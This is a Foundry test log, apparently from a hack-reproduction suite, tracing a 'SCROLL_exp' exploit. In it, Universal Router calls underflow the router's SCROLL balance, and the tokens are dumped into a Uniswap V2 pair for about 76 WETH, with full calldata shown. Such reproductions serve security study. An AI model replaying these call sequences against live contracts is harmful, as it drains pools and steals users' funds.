Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.20s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-05/SCROLL_exp.sol:31:5:
   |
31 |     WETH9 constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (3628): This contract has a payable fallback function, but no receive ether function. Consider adding a receive ether function.
  --> src/test/2024-05/SCROLL_exp.sol:22:1:
   |
22 | contract ContractTest is Test {
   | ^ (Relevant source part starts here and spans across multiple lines).
Note: The payable fallback function is defined here.
  --> src/test/2024-05/SCROLL_exp.sol:67:5:
   |
67 |     fallback() external payable {}
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 271.83ms (162.97µs CPU time)

Ran 1 test for src/test/2024-05/SCROLL_exp.sol:ContractTest
[PASS] testExploit() (gas: 437268)
Traces:
  [488268] ContractTest::testExploit()
    ├─ [2908] SCROLL::balanceOf(Universal Router: [0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [132204] Universal Router::execute(0x05, [0x000000000000000000000000e51d3de9b81916d383ef97855c271250852ec7b700000000000000000000000072c509b05a44c4bb53373efc2e76fb75fa8108a60000000000000000000000000000000000000000000000000000000000000001])
    │   ├─ [125108] SCROLL::transfer(0x72C509B05A44c4Bb53373Efc2E76fB75FA8108a6, 1)
    │   │   ├─ emit Transfer(from: Universal Router: [0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD], to: 0x72C509B05A44c4Bb53373Efc2E76fB75FA8108a6, value: 1)
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 
    ├─ [908] SCROLL::balanceOf(Universal Router: [0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [2908] SCROLL::balanceOf(Uniswap V2 pair SCROLL WETH: [0xa718aa1b3f61C2b90A01aB244597816a7eE69fD2]) [staticcall]
    │   └─ ← [Return] 136275915391323680414683 [1.362e23]
    ├─ [8612] Uniswap V2 Router::getAmountsOut(136275915391323680414683000 [1.362e26], [0xe51D3dE9b81916D383eF97855C271250852eC7B7, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [staticcall]
    │   ├─ [2504] Uniswap V2 pair SCROLL WETH::getReserves() [staticcall]
    │   │   └─ ← [Return] 76436699224492990081 [7.643e19], 136275915391323680414683 [1.362e23], 1716938231 [1.716e9]
    │   └─ ← [Return] [136275915391323680414683000 [1.362e26], 76360109345510532175 [7.636e19]]
    ├─ [111683] Universal Router::execute(0x05, [0x000000000000000000000000e51d3de9b81916d383ef97855c271250852ec7b7000000000000000000000000a718aa1b3f61c2b90a01ab244597816a7ee69fd200000000000000000000000000000000000000000070b98c2d1dd0bb5b9ccf78])
    │   ├─ [106587] SCROLL::transfer(Uniswap V2 pair SCROLL WETH: [0xa718aa1b3f61C2b90A01aB244597816a7eE69fD2], 136275915391323680414683000 [1.362e26])
    │   │   ├─ emit Transfer(from: Universal Router: [0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD], to: Uniswap V2 pair SCROLL WETH: [0xa718aa1b3f61C2b90A01aB244597816a7eE69fD2], value: 136275915391323680414683000 [1.362e26])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 
    ├─ [65227] Uniswap V2 pair SCROLL WETH::swap(76360109345510532175 [7.636e19], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   ├─ [29962] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 76360109345510532175 [7.636e19])
    │   │   ├─ emit Transfer(from: Uniswap V2 pair SCROLL WETH: [0xa718aa1b3f61C2b90A01aB244597816a7eE69fD2], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 76360109345510532175 [7.636e19])
    │   │   └─ ← [Return] true
    │   ├─ [534] WETH::balanceOf(Uniswap V2 pair SCROLL WETH: [0xa718aa1b3f61C2b90A01aB244597816a7eE69fD2]) [staticcall]
    │   │   └─ ← [Return] 76589878982457906 [7.658e16]
    │   ├─ [908] SCROLL::balanceOf(Uniswap V2 pair SCROLL WETH: [0xa718aa1b3f61C2b90A01aB244597816a7eE69fD2]) [staticcall]
    │   │   └─ ← [Return] 136412191306715004095097683 [1.364e26]
    │   ├─ emit Sync(reserve0: 76589878982457906 [7.658e16], reserve1: 136412191306715004095097683 [1.364e26])
    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 136275915391323680414683000 [1.362e26], amount0Out: 76360109345510532175 [7.636e19], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 76360109345510532175 [7.636e19]
    ├─ [9180] WETH::withdraw(76360109345510532175 [7.636e19])
    │   ├─ [40] ContractTest::fallback{value: 76360109345510532175}()
    │   │   └─ ← [Stop] 
    │   ├─ emit Withdrawal(src: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 76360109345510532175 [7.636e19])
    │   └─ ← [Stop] 
    ├─ [908] SCROLL::balanceOf(Universal Router: [0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640427763542192684232714956935 [1.157e77]
    ├─ [124783] Universal Router::execute(0x05, [0x000000000000000000000000e51d3de9b81916d383ef97855c271250852ec7b70000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496ffffffffffffffffffffffffffffffffffffffffff8f4673d2e22f44a4633087])
    │   ├─ [119687] SCROLL::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640427763542192684232714956935 [1.157e77])
    │   │   ├─ emit Transfer(from: Universal Router: [0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 115792089237316195423570985008687907853269984665640427763542192684232714956935 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.60s (1.96s CPU time)

Ran 2 test suites in 2.60s (2.87s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
